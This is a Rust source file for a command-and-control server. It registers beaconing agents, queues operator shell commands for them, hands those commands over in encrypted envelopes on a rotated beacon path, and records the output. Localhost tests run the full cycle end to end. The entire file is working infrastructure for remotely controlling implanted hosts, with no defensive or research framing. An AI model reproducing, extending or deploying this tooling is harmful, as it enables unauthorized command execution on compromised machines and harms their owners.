//! C2 server: agent registry, command queue, HTTP API.
//!
//! The server accepts beacons either raw (from slave daemons) or sealed in a
//! [`MessageEnvelope`] (from agents), queues operator commands, hands them to the
//! agent on its next beacon, and records command results.

use std::collections::HashMap;
use std::convert::Infallible;
use std::net::SocketAddr;
use std::path::PathBuf;
use std::sync::Arc;

use bytes::Bytes;
use chrono::Utc;
use http_body_util::{BodyExt, Full};
use hyper::body::Incoming;
use hyper::service::service_fn;
use hyper::{Request, Response, StatusCode};
use hyper_util::rt::{TokioExecutor, TokioIo};
use serde::{Deserialize, Serialize};
use tokio::sync::RwLock;
use tracing::{error, info, warn};
use uuid::Uuid;

use crate::common::{
    open_envelope, seal_envelope, AgentRole, BeaconMessage, ChannelType, CommandMessage,
    CommandType, MessageEnvelope, Priority, ResponseMessage,
};

type ResBody = Full<Bytes>;

fn body_from<T: Into<Bytes>>(data: T) -> ResBody {
    Full::new(data.into())
}

fn json_response(status: StatusCode, body: Vec<u8>) -> Response<ResBody> {
    Response::builder()
        .status(status)
        .header("Content-Type", "application/json")
        .body(body_from(body))
        .unwrap()
}

fn error_response(status: StatusCode, msg: &str) -> Response<ResBody> {
    Response::builder()
        .status(status)
        .header("Content-Type", "application/json")
        .body(body_from(
            serde_json::json!({ "error": msg }).to_string(),
        ))
        .unwrap()
}

/// Everything known about one agent.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct AgentRecord {
    pub beacon: BeaconMessage,
    pub role: AgentRole,
    pub channel: ChannelType,
    #[serde(default)]
    pub pending: Vec<CommandMessage>,
    #[serde(default)]
    pub results: Vec<ResponseMessage>,
}

#[derive(Debug, Default, Serialize, Deserialize)]
struct Persisted {
    #[serde(default)]
    agents: HashMap<Uuid, AgentRecord>,
}

/// Shared server state.
pub struct ServerState {
    agents: RwLock<HashMap<Uuid, AgentRecord>>,
    master_key: String,
    role: AgentRole,
    master_url: Option<String>,
    master_id: Option<Uuid>,
    peers: RwLock<HashMap<Uuid, String>>,
    state_file: Option<PathBuf>,
}

impl ServerState {
    pub fn new(
        master_key: String,
        role: AgentRole,
        master_url: Option<String>,
        state_file: Option<PathBuf>,
    ) -> Self {
        Self {
            agents: RwLock::new(HashMap::new()),
            master_key,
            role,
            master_url,
            master_id: None,
            peers: RwLock::new(HashMap::new()),
            state_file,
        }
    }

    /// Load persisted state from disk, if a file was configured and exists.
    pub async fn load(mut self) -> Self {
        let Some(path) = self.state_file.clone() else {
            return self;
        };
        let Ok(data) = tokio::fs::read(&path).await else {
            return self;
        };
        match serde_json::from_slice::<Persisted>(&data) {
            Ok(saved) => {
                info!("Loaded {} agents from {}", saved.agents.len(), path.display());
                self.agents = RwLock::new(saved.agents);
            }
            Err(e) => warn!("Failed to parse {}: {}", path.display(), e),
        }
        self
    }

    async fn persist(&self) {
        let Some(path) = &self.state_file else {
            return;
        };
        let saved = Persisted {
            agents: self.agents.read().await.clone(),
        };
        match serde_json::to_vec_pretty(&saved) {
            Ok(data) => {
                if let Err(e) = tokio::fs::write(path, data).await {
                    error!("Failed to write {}: {}", path.display(), e);
                }
            }
            Err(e) => error!("Failed to serialize state: {}", e),
        }
    }

    /// Register or refresh an agent, keeping its queue and results.
    pub async fn register(&self, beacon: BeaconMessage) {
        let role = beacon
            .metadata
            .as_ref()
            .map(|m| m.role.clone())
            .unwrap_or(AgentRole::Slave);

        let mut agents = self.agents.write().await;
        let record = agents
            .entry(beacon.agent_id)
            .or_insert_with(|| AgentRecord {
                beacon: beacon.clone(),
                role: role.clone(),
                channel: ChannelType::Https,
                pending: Vec::new(),
                results: Vec::new(),
            });
        record.beacon = beacon;
        record.role = role;
        drop(agents);
        self.persist().await;
    }

    /// Queue a command. Returns false when the agent is unknown.
    pub async fn enqueue(&self, command: CommandMessage) -> bool {
        let mut agents = self.agents.write().await;
        let Some(record) = agents.get_mut(&command.agent_id) else {
            return false;
        };
        record.pending.push(command);
        drop(agents);
        self.persist().await;
        true
    }

    /// Drain and return commands waiting for an agent.
    pub async fn take_pending(&self, agent_id: Uuid) -> Vec<CommandMessage> {
        let mut agents = self.agents.write().await;
        let Some(record) = agents.get_mut(&agent_id) else {
            return Vec::new();
        };
        let commands = std::mem::take(&mut record.pending);
        drop(agents);
        if !commands.is_empty() {
            self.persist().await;
        }
        commands
    }

    /// Record a command result. Returns false when the agent is unknown.
    pub async fn record(&self, response: ResponseMessage) -> bool {
        let mut agents = self.agents.write().await;
        let Some(record) = agents.get_mut(&response.agent_id) else {
            return false;
        };
        record
            .pending
            .retain(|c| c.id != response.command_id);
        record.results.push(response);
        drop(agents);
        self.persist().await;
        true
    }

    pub async fn set_peer(&self, peer: Uuid, address: String) {
        self.peers.write().await.insert(peer, address);
    }

    pub fn role(&self) -> &AgentRole {
        &self.role
    }

    pub fn master_id(&self) -> Option<Uuid> {
        self.master_id
    }

    pub async fn peer_ids(&self) -> Vec<Uuid> {
        self.peers.read().await.keys().copied().collect()
    }

    pub async fn list_agents(&self) -> Vec<serde_json::Value> {
        self.agents
            .read()
            .await
            .values()
            .map(agent_json)
            .collect()
    }

    pub async fn get_agent(&self, id: Uuid) -> Option<serde_json::Value> {
        self.agents.read().await.get(&id).map(agent_json)
    }

    pub async fn status(&self) -> serde_json::Value {
        let agents = self.agents.read().await;
        let peers = self.peers.read().await;
        serde_json::json!({
            "role": self.role,
            "master_url": self.master_url,
            "master_id": self.master_id,
            "agents": agents.len(),
            "peers": peers.len(),
            "pending_commands": agents.values().map(|a| a.pending.len()).sum::<usize>(),
        })
    }

    async fn seal(&self, payload: Vec<u8>) -> Result<MessageEnvelope, String> {
        let mut envelope = MessageEnvelope {
            version: 1,
            sequence: 0,
            timestamp: Utc::now().timestamp_millis() as u64,
            channel: ChannelType::Https,
            encrypted_payload: payload,
            auth_tag: [0u8; 16],
        };
        seal_envelope(&self.master_key, &mut envelope).map_err(|e| e.to_string())?;
        Ok(envelope)
    }

    async fn open(&self, envelope: &MessageEnvelope) -> Result<Vec<u8>, String> {
        open_envelope(&self.master_key, envelope).map_err(|e| e.to_string())
    }
}

fn agent_json(record: &AgentRecord) -> serde_json::Value {
    serde_json::json!({
        "id": record.beacon.agent_id,
        "last_seen": record.beacon.timestamp,
        "role": record.role,
        "channel": record.channel,
        "capabilities": record.beacon.capabilities,
        "pending": record.pending,
        "results": record.results,
    })
}

/// An incoming body is either a sealed envelope or raw JSON.
enum IncomingBody {
    Envelope(MessageEnvelope),
    Raw(Vec<u8>),
}

fn split_body(bytes: &[u8]) -> IncomingBody {
    match serde_json::from_slice::<MessageEnvelope>(bytes) {
        Ok(envelope) if envelope.encrypted_payload.len() >= 28 => IncomingBody::Envelope(envelope),
        _ => IncomingBody::Raw(bytes.to_vec()),
    }
}

#[derive(Debug, Deserialize)]
struct CommandRequest {
    agent_id: Uuid,
    command: String,
    #[serde(default)]
    working_dir: Option<String>,
    #[serde(default)]
    timeout: Option<u64>,
}

async fn handle_beacon(state: &ServerState, body: IncomingBody) -> Response<ResBody> {
    let (beacon, sealed) = match body {
        IncomingBody::Envelope(envelope) => match state.open(&envelope).await {
            Ok(plain) => match serde_json::from_slice::<BeaconMessage>(&plain) {
                Ok(beacon) => (beacon, true),
                // The agent also posts command results on its beacon path.
                Err(beacon_err) => match serde_json::from_slice::<ResponseMessage>(&plain) {
                    Ok(response) => {
                        state.record(response).await;
                        return Response::builder()
                            .status(StatusCode::OK)
                            .body(body_from(""))
                            .unwrap();
                    }
                    Err(_) => {
                        return error_response(
                            StatusCode::BAD_REQUEST,
                            &format!("bad beacon: {beacon_err}"),
                        )
                    }
                },
            },
            Err(e) => return error_response(StatusCode::BAD_REQUEST, &format!("bad envelope: {e}")),
        },
        IncomingBody::Raw(raw) => match serde_json::from_slice::<BeaconMessage>(&raw) {
            Ok(beacon) => (beacon, false),
            Err(e) => return error_response(StatusCode::BAD_REQUEST, &format!("bad beacon: {e}")),
        },
    };

    let agent_id = beacon.agent_id;
    state.register(beacon).await;
    let commands = state.take_pending(agent_id).await;

    if sealed {
        match state.seal(serde_json::to_vec(&commands).unwrap_or_default()).await {
            Ok(envelope) => match serde_json::to_vec(&envelope) {
                Ok(body) => json_response(StatusCode::OK, body),
                Err(e) => error_response(StatusCode::INTERNAL_SERVER_ERROR, &e.to_string()),
            },
            Err(e) => error_response(StatusCode::INTERNAL_SERVER_ERROR, &e),
        }
    } else {
        json_response(StatusCode::OK, serde_json::to_vec(&commands).unwrap_or_default())
    }
}

async fn handle_command(state: &ServerState, body: IncomingBody) -> Response<ResBody> {
    let raw = match body {
        IncomingBody::Raw(raw) => raw,
        IncomingBody::Envelope(envelope) => match state.open(&envelope).await {
            Ok(plain) => plain,
            Err(e) => return error_response(StatusCode::BAD_REQUEST, &format!("bad envelope: {e}")),
        },
    };

    let request: CommandRequest = match serde_json::from_slice(&raw) {
        Ok(r) => r,
        Err(e) => return error_response(StatusCode::BAD_REQUEST, &format!("bad request: {e}")),
    };

    let command = CommandMessage {
        id: Uuid::new_v4(),
        agent_id: request.agent_id,
        command: CommandType::Execute {
            command: request.command,
            working_dir: request.working_dir,
            timeout: request.timeout,
        },
        payload: None,
        priority: Priority::Normal,
        timeout: request.timeout,
        created_at: Utc::now(),
    };
    let command_id = command.id;

    if !state.enqueue(command).await {
        return error_response(StatusCode::NOT_FOUND, "unknown agent");
    }

    json_response(
        StatusCode::OK,
        serde_json::to_vec(&serde_json::json!({
            "command_id": command_id,
            "status": "queued",
        }))
        .unwrap_or_default(),
    )
}

async fn handle_response(state: &ServerState, body: IncomingBody) -> Response<ResBody> {
    let raw = match body {
        IncomingBody::Raw(raw) => raw,
        IncomingBody::Envelope(envelope) => match state.open(&envelope).await {
            Ok(plain) => plain,
            Err(e) => return error_response(StatusCode::BAD_REQUEST, &format!("bad envelope: {e}")),
        },
    };

    let response: ResponseMessage = match serde_json::from_slice(&raw) {
        Ok(r) => r,
        Err(e) => return error_response(StatusCode::BAD_REQUEST, &format!("bad response: {e}")),
    };

    if !state.record(response).await {
        return error_response(StatusCode::NOT_FOUND, "unknown agent");
    }
    Response::builder()
        .status(StatusCode::OK)
        .body(body_from(""))
        .unwrap()
}

async fn route(state: Arc<ServerState>, req: Request<Incoming>) -> Response<ResBody> {
    let method = req.method().clone();
    let path = req.uri().path().to_string();

    match (method.as_str(), path.as_str()) {
        ("GET", "/health") => Response::builder()
            .status(StatusCode::OK)
            .body(body_from("OK"))
            .unwrap(),
        ("GET", "/status") => json_response(
            StatusCode::OK,
            serde_json::to_vec(&state.status().await).unwrap_or_default(),
        ),
        ("GET", "/agents") => json_response(
            StatusCode::OK,
            serde_json::to_vec(&state.list_agents().await).unwrap_or_default(),
        ),
        // /api/beacon is the agent's rotated path; treat it as the same endpoint.
        ("POST", "/beacon") | ("POST", "/api/beacon") | ("POST", "/command") | ("POST", "/response") => {
            let body = match req.into_body().collect().await {
                Ok(collected) => split_body(&collected.to_bytes()),
                Err(e) => return error_response(StatusCode::BAD_REQUEST, &e.to_string()),
            };
            match path.as_str() {
                "/beacon" | "/api/beacon" => handle_beacon(&state, body).await,
                "/command" => handle_command(&state, body).await,
                _ => handle_response(&state, body).await,
            }
        }
        ("GET", p) if p.starts_with("/agents/") => {
            match Uuid::parse_str(&p["/agents/".len()..]) {
                Ok(id) => match state.get_agent(id).await {
                    Some(json) => {
                        json_response(StatusCode::OK, serde_json::to_vec(&json).unwrap_or_default())
                    }
                    None => error_response(StatusCode::NOT_FOUND, "unknown agent"),
                },
                Err(_) => error_response(StatusCode::BAD_REQUEST, "invalid agent id"),
            }
        }
        _ => error_response(StatusCode::NOT_FOUND, "not found"),
    }
}

/// Serve on an already-bound listener (used by tests).
pub async fn serve_listener(
    state: Arc<ServerState>,
    listener: tokio::net::TcpListener,
) -> std::io::Result<()> {
    let addr = listener.local_addr()?;
    info!("C2 server listening on http://{}", addr);

    loop {
        let (stream, _peer) = listener.accept().await?;
        let state = state.clone();
        tokio::spawn(async move {
            let io = TokioIo::new(stream);
            let service = service_fn(move |req| {
                let state = state.clone();
                async move { Ok::<_, Infallible>(route(state, req).await) }
            });
            if let Err(e) = hyper_util::server::conn::auto::Builder::new(TokioExecutor::new())
                .serve_connection(io, service)
                .await
            {
                error!("Connection error: {}", e);
            }
        });
    }
}

/// Bind and serve.
pub async fn serve(state: Arc<ServerState>, addr: SocketAddr) -> std::io::Result<()> {
    let listener = tokio::net::TcpListener::bind(addr).await?;
    serve_listener(state, listener).await
}

#[cfg(test)]
mod tests {
    use super::*;
    use chrono::Utc;
    use crate::common::{BeaconMessage, ResponseStatus};

    fn test_beacon(id: Uuid) -> BeaconMessage {
        BeaconMessage {
            agent_id: id,
            timestamp: Utc::now(),
            uptime: 1,
            last_seen: Utc::now(),
            capabilities: vec!["shell".to_string()],
            metadata: None,
        }
    }

    #[tokio::test]
    async fn queue_and_record_roundtrip() {
        let state = ServerState::new("key".into(), AgentRole::Master, None, None);
        let id = Uuid::new_v4();
        state.register(test_beacon(id)).await;

        let command = CommandMessage {
            id: Uuid::new_v4(),
            agent_id: id,
            command: CommandType::Execute {
                command: "echo hi".into(),
                working_dir: None,
                timeout: None,
            },
            payload: None,
            priority: Priority::Normal,
            timeout: None,
            created_at: Utc::now(),
        };
        assert!(state.enqueue(command.clone()).await);
        assert_eq!(state.take_pending(id).await.len(), 1);
        assert!(state.take_pending(id).await.is_empty());

        assert!(state
            .record(ResponseMessage {
                command_id: command.id,
                agent_id: id,
                status: ResponseStatus::Success,
                output: Some(b"hi".to_vec()),
                error: None,
                completed_at: Utc::now(),
            })
            .await);

        let agent = state.get_agent(id).await.unwrap();
        assert_eq!(agent["results"].as_array().unwrap().len(), 1);
    }

    #[tokio::test]
    async fn http_end_to_end() {
        let state = Arc::new(ServerState::new("test-key".into(), AgentRole::Master, None, None));
        let listener = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
        let addr = listener.local_addr().unwrap();
        tokio::spawn(serve_listener(state.clone(), listener));

        let client = reqwest::Client::new();
        let base = format!("http://{addr}");
        let id = Uuid::new_v4();

        // Agent beacons with a sealed envelope.
        let mut envelope = MessageEnvelope {
            version: 1,
            sequence: 0,
            timestamp: Utc::now().timestamp_millis() as u64,
            channel: ChannelType::Https,
            encrypted_payload: serde_json::to_vec(&test_beacon(id)).unwrap(),
            auth_tag: [0u8; 16],
        };
        seal_envelope("test-key", &mut envelope).unwrap();
        let resp = client
            .post(format!("{base}/beacon"))
            .json(&envelope)
            .send()
            .await
            .unwrap();
        assert!(resp.status().is_success());

        // Server sees the agent.
        let agents: Vec<serde_json::Value> = client
            .get(format!("{base}/agents"))
            .send()
            .await
            .unwrap()
            .json()
            .await
            .unwrap();
        assert_eq!(agents.len(), 1);

        // Operator queues a command.
        let resp = client
            .post(format!("{base}/command"))
            .json(&serde_json::json!({ "agent_id": id, "command": "echo hi" }))
            .send()
            .await
            .unwrap();
        assert!(resp.status().is_success());
        let command_id = resp.json::<serde_json::Value>().await.unwrap()["command_id"]
            .as_str()
            .unwrap()
            .to_owned();

        // Next beacon delivers it inside a sealed envelope.
        let mut envelope = MessageEnvelope {
            version: 1,
            sequence: 1,
            timestamp: Utc::now().timestamp_millis() as u64,
            channel: ChannelType::Https,
            encrypted_payload: serde_json::to_vec(&test_beacon(id)).unwrap(),
            auth_tag: [0u8; 16],
        };
        seal_envelope("test-key", &mut envelope).unwrap();
        let delivery: MessageEnvelope = client
            .post(format!("{base}/beacon"))
            .json(&envelope)
            .send()
            .await
            .unwrap()
            .json()
            .await
            .unwrap();
        let commands: Vec<CommandMessage> =
            serde_json::from_slice(&open_envelope("test-key", &delivery).unwrap()).unwrap();
        assert_eq!(commands.len(), 1);
        assert_eq!(commands[0].id.to_string(), command_id);

        // Agent posts the result.
        let mut envelope = MessageEnvelope {
            version: 1,
            sequence: 2,
            timestamp: Utc::now().timestamp_millis() as u64,
            channel: ChannelType::Https,
            encrypted_payload: serde_json::to_vec(&ResponseMessage {
                command_id: commands[0].id,
                agent_id: id,
                status: ResponseStatus::Success,
                output: Some(b"hi".to_vec()),
                error: None,
                completed_at: Utc::now(),
            })
            .unwrap(),
            auth_tag: [0u8; 16],
        };
        seal_envelope("test-key", &mut envelope).unwrap();
        // The agent sends results on the same path as its beacons.
        let resp = client
            .post(format!("{base}/beacon"))
            .json(&envelope)
            .send()
            .await
            .unwrap();
        assert!(resp.status().is_success());

        let agent: serde_json::Value = client
            .get(format!("{base}/agents/{id}"))
            .send()
            .await
            .unwrap()
            .json()
            .await
            .unwrap();
        assert_eq!(agent["results"].as_array().unwrap().len(), 1);
        assert!(agent["pending"].as_array().unwrap().is_empty());
    }
}
